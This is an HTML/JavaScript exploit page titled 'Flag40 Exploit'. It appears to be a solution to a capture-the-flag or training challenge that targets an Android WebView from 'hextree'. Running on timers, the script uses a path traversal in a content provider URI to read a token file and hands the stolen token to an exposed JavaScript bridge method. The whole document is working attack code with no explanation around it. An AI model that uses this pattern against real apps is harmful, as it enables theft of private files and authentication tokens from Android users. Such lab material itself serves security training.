<!DOCTYPE html>
<html>
<head>
    <title>Flag40 Exploit</title>
    <script>
        function stealToken() {
            try {
                const xhr = new XMLHttpRequest();
                xhr.open("GET", "content://io.hextree.attacksurface.files/../other_files/token.txt", true);
                //xhr.open("GET", "content://io.hextree.files/../other_files/token.txt", true);
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        const token = xhr.responseText.trim();
                        console.log("Stolen token:", token);
                        
                        // Call the exposed authCallback method (if available)
                        if (window.hextree && typeof window.hextree.authCallback === "function") {
                            window.hextree.authCallback(token);
                        } else {
                            document.body.innerHTML = "<h2>Token: " + token + "</h2>";
                        }
                    } else {
                        document.body.innerHTML = "Token file not found."
                    }
                };
                xhr.send();
            } catch (e) {
                console.error("Exploit failed:", e);
            }
        }

        // Try a few times in case the WebView needs time
        setTimeout(stealToken, 500);
        setTimeout(stealToken, 1000);
        setTimeout(stealToken, 1500);
    </script>
</head>
<body>
    <h1>Running exploit...</h1>
</body>
</html>
